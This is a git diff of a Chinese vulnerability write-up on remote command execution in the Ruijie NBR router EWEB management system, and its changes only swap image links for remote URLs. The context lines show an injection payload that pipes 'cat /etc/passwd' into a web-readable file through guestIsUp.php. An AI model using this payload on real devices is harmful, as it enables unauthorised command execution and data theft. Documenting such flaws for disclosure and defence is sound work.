@@ -20,7 +20,7 @@
 
 ## 漏洞复现
 
-![](image/ruijie-6.png)
+![](http://wikioss.peiqi.tech/vuln/ruijie-6.png)
 
 出现漏洞的文件在 **/guest_auth/guestIsUp.php**
 
@@ -52,7 +52,7 @@ mac=1&ip=127.0.0.1|cat /etc/passwd > PeiQi.txt
 
 然后访问页面 **/guest_auth/PeiQi.txt** 就可以看到命令执行的结果
 
-![](image/ruijie-5.png)
+![](http://wikioss.peiqi.tech/vuln/ruijie-5.png)
 
 ## 漏洞利用POC
 
@@ -122,7 +122,7 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/ruijie-7.png)
+![](http://wikioss.peiqi.tech/vuln/ruijie-7.png)
 
 ## Goby & POC
 
@@ -130,7 +130,7 @@ if __name__ == '__main__':
 >
 > 锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞
 
-![](image/ruijie-8.png)
+![](http://wikioss.peiqi.tech/vuln/ruijie-8.png)
 
 
 
